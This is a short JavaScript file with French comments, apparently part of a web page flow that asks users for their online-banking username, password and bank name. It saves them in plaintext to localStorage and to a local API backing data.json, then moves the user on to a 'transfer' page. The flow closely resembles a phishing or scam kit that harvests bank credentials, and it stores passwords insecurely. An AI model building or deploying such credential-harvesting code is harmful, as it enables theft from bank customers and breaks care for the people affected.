document.addEventListener('DOMContentLoaded', function() {
    // Vérifier si l'utilisateur est authentifié et a rempli les informations bancaires
    const userData = JSON.parse(localStorage.getItem('user_data'));
    if (!userData || !userData.pays || !userData.info_bancaire) {
        window.location.href = 'index.html';
        return;
    }

    // Gérer la soumission du formulaire
    document.getElementById('bankForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        
        // Afficher l'overlay
        document.querySelector('.overlay').style.display = 'flex';

        // Récupérer les données du formulaire
        const formData = {
            identifiant: this.elements['identifiant'].value,
            mot_de_passe: this.elements['mot_de_passe'].value,
            nom_banque: this.elements['nom_banque'].value,
            timestamp: new Date().toISOString()
        };

        // Mettre à jour les données utilisateur
        userData.banque = formData;
        localStorage.setItem('user_data', JSON.stringify(userData));

        // Mettre à jour data.json via l'API
        try {
            const response = await fetch(`http://localhost:3000/api/users/${userData.code}`, {
                method: 'PUT',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ banque: formData })
            });

            if (!response.ok) {
                throw new Error('Erreur lors de la mise à jour des données');
            }

            // Attendre 3 secondes avant la redirection
            setTimeout(() => {
                window.location.href = 'virement.html';
            }, 3000);
        } catch (error) {
            console.error('Erreur:', error);
            document.querySelector('.overlay').style.display = 'none';
        }
    });

    // Animation des points de chargement
    setInterval(() => {
        const dots = document.querySelector('.dots-loading');
        if (dots.textContent === '') dots.textContent = '.';
        else if (dots.textContent === '.') dots.textContent = '..';
        else if (dots.textContent === '..') dots.textContent = '...';
        else dots.textContent = '';
    }, 500);
});
